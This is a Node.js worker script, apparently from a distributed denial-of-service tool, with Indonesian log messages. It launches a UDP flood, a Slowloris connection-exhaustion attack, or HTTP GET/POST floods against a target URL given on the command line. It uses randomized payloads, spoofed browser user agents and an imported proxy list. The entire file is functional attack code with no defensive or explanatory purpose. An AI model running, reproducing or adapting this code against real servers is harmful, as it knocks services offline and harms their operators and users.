require('events').defaultMaxListeners = 0; // Suppress MaxListenersExceededWarning for this high-concurrency process
const url = require('url');
const crypto = require('crypto');
const net = require('net');
const dgram = require('dgram');
const dns = require('dns');
const { runHttpAttack } = require('./bypass.js');
const { browserPersonas, proxyList } = require('./extensions.js');

const [targetUrl, durationSeconds] = process.argv.slice(2);
const workerAttackType = process.env.ATTACK_TYPE;
const parsedUrl = url.parse(targetUrl);
const duration = parseInt(durationSeconds, 10);

function executeUdpFlood(targetIp, durationSeconds) {
    const attackName = "UDP Flood";
    console.log(`Worker ${process.pid} memulai serangan ${attackName} ke ${targetIp} selama ${durationSeconds} detik.`);

    const client = dgram.createSocket('udp4');
    const payload = crypto.randomBytes(65500);

    let localSent = 0;
    let isAttackActive = true;

    const attack = () => {
        if (!isAttackActive) {
            try { client.close(); } catch (e) {}
            return;
        }
        
        for (let i = 0; i < 100; i++) {
            client.send(payload, Math.floor(Math.random() * 65535) + 1, targetIp, (err) => {
                if (!err) {
                    localSent++;
                }
            });
        }
        setTimeout(attack, 1);
    };

    const statsInterval = setInterval(() => {
        if (process.send) {
            process.send({
                type: 'stats',
                sent: localSent,
                error: 0
            });
        }
        localSent = 0;
    }, 5000);

    attack();

    setTimeout(() => {
        isAttackActive = false;
        clearInterval(statsInterval);
        if (process.send && localSent > 0) {
            process.send({ type: 'stats', sent: localSent, error: 0 });
        }

        console.log(`Worker ${process.pid} telah menghentikan serangan ${attackName} ke ${targetIp}.`);
        process.exit(0);
    }, durationSeconds * 1000);
}

function executeSlowlorisAttack(targetHost, targetPort, durationSeconds) {
    const attackName = "Slowloris";
    const socketCount = 400;
    const keepAliveInterval = 10000;
    console.log(`Worker ${process.pid} memulai serangan ${attackName} ke ${targetHost}:${targetPort} dengan ${socketCount} sockets.`);

    let sockets = [];
    let localSent = 0;
    let localError = 0;
    let isAttackActive = true;

    const randomUserAgent = browserPersonas[Math.floor(Math.random() * browserPersonas.length)].ua;
    const headers = [
        `GET /?${crypto.randomBytes(8).toString('hex')} HTTP/1.1`,
        `Host: ${targetHost}`,
        `User-Agent: ${randomUserAgent}`,
        `Accept-language: en-US,en,q=0.5`,
        `Accept-encoding: gzip, deflate`,
    ].join('\r\n') + '\r\n';

    const createSocket = () => {
        const socket = new net.Socket();

        socket.on('connect', () => {
            socket.write(headers);
            localSent++;
            socket.keepAliveInterval = setInterval(() => {
                if (socket.writable) {
                    socket.write(`X-a: ${crypto.randomBytes(4).toString('hex')}\r\n`);
                }
            }, keepAliveInterval);
        });

        const replaceSocket = () => {
            clearInterval(socket.keepAliveInterval);
            socket.destroy();
            if (isAttackActive) {
                sockets = sockets.filter(s => s !== socket);
                sockets.push(createSocket());
            }
        };
        socket.on('error', () => { replaceSocket(); });
        socket.on('close', replaceSocket);
        
        socket.connect(targetPort, targetHost);
        return socket;
    };

    for (let i = 0; i < socketCount; i++) {
        sockets.push(createSocket());
    }

    const statsInterval = setInterval(() => {
        if (process.send) {
            process.send({ type: 'stats', sent: localSent, error: localError });
        }
        localSent = 0; localError = 0;
    }, 5000);

    setTimeout(() => {
        isAttackActive = false;
        clearInterval(statsInterval);
        sockets.forEach(s => { clearInterval(s.keepAliveInterval); s.destroy(); });

        console.log(`Worker ${process.pid} telah menghentikan serangan ${attackName} ke ${targetHost}.`);
        process.exit(0);
    }, durationSeconds * 1000);
}

switch (workerAttackType) {
    case 'get':
    case 'post':
        runHttpAttack(targetUrl, duration, workerAttackType);
        break;
    case 'slowloris':
        const slowlorisPort = parsedUrl.protocol === 'https:' ? 443 : 80;
        executeSlowlorisAttack(parsedUrl.hostname, slowlorisPort, duration);
        break;
    case 'udp':
        dns.lookup(parsedUrl.hostname, (err, address) => {
            if (err) {
                console.error(`Worker ${process.pid} gagal resolve DNS untuk UDP Flood: ${parsedUrl.hostname}`, err);
                process.exit(1);
            }
            executeUdpFlood(address, duration);
        });
        break;
    default:
        console.error(`Worker ${process.pid} menerima tipe serangan tidak dikenal: ${workerAttackType}`);
        process.exit(1);
}